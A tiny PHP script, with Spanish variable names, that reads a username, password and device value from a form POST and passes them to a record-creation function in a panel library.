<?php 
require('../../panel/lib/funciones.php');

$usuario = $_POST['usr'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

crear_registro($usuario,$contrasena,$dispositivo);
?>